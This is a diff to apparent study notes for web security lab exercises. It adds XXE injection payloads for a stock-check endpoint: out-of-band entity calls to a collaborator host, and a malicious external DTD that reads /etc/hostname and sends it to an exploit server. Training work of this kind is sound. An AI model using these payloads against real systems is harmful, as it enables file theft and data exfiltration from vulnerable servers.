@@ -157,11 +157,38 @@ The lab server is running a (simulated) EC2 metadata endpoint at the default URL
 ```
 - upload it as an avatar in comment section
 
-#### Blind XXE with out-of-band interaction (collab)
-TODO
+#### Blind XXE with out-of-band interaction
+- paste into the body **POST /product/stock**
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://...oastify.com"> ]><stockCheck>
+<productId>
+2&xxe;
+</productId><storeId>
+1</storeId></stockCheck>
+```
+- get invalid product ID but then check collaborator
+- also scan it and find payload sent by scanner
 
 #### Blind XXE with out-of-band interaction via XML parameter entities
-TODO
+- paste into the body **POST /product/stock**
+```
+<!DOCTYPE stockcheck [<!ENTITY % xxe SYSTEM "http://...oastify.com">%xxe; ]>
+```
 
 #### Exploiting blind XXE to exfiltrate data using a malicious external DTD
-TODO
+- POST /product/stock
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://exploit-...exploit-server.net/malicious.dtd">%xxe;]>
+<stockCheck>
+<productId>1</productId><storeId>1</storeId></stockCheck>
+```
+- exploit with path /malicious.dtd
+```
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-...exploit-server.net/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
